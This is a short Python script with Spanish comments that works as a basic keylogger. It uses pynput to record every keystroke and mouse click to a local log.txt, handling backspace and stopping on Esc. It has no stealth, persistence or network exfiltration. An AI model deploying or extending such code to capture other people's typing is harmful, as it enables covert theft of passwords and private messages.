from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener

import os

log_file = "log.txt"

# Diccionario para reemplazar teclas especiales
key_replacements = {
  "Key.space": " ",
  "Key.enter": "\n",
  "Key.tab": "\n",
}

# Lista de teclas a ignorar
ignored_keys = {
  "Key.shift", "Key.shift_r", "Key.shift_l",
  "Key.ctrl", "Key.ctrl_r", "Key.ctrl_l",
  "Key.alt", "Key.alt_r", "Key.alt_l",
  "Key.caps_lock","Key.delete", "Key.cmd", "Key.cmd_r", "Key.cmd_l",
  "Key.home", "Key.end", "Key.page_up", "Key.page_down",
  "Key.insert", "Key.print_screen", "Key.scroll_lock",
  "Key.num_lock", "Key.menu", "Key.pause",
  "Key.left", "Key.right", "Key.up", "Key.down",
  "Key.alt_gr", "_r","\\x03","\\x18","\\x16"
} | {f"Key.f{i}" for i in range(1, 25)} # Agregamos las teclas F1 a F24 automáticamente

def on_press(key):
  
  key = str(key).replace("'", "")
  
  # Reemplazamos las teclas especiales
  key = key_replacements.get(key, key)
  
  # Ignoramos las teclas que no queremos guardar
  if key in ignored_keys:
      return
  
  if key == "Key.backspace":
    
    try:
      if os.path.exists(log_file):
        with open(log_file, "r") as f:
          data = f.read()
        with open(log_file, "w") as f:
          f.write(data[:-1])
    except Exception as e:
      print(f"Error al borrar: {e}")
    return
  elif key == "Key.esc":
    return keyboard_listener.stop(), mouse_listener.stop()
  else:
    with open(log_file, "a") as f:
        f.write(key)
  
# Función para guardar el click del mouse
# Solo guardamos un salto de línea
# Dejamos x, y y button para que no de error
def on_click(x, y, button, pressed):
  if pressed:
    with open(log_file, "a") as f:
      f.write("\n")

# Iniciamos los listeners
with KeyboardListener(on_press=on_press) as keyboard_listener, MouseListener(on_click=on_click) as mouse_listener:
  keyboard_listener.join()
  mouse_listener.join()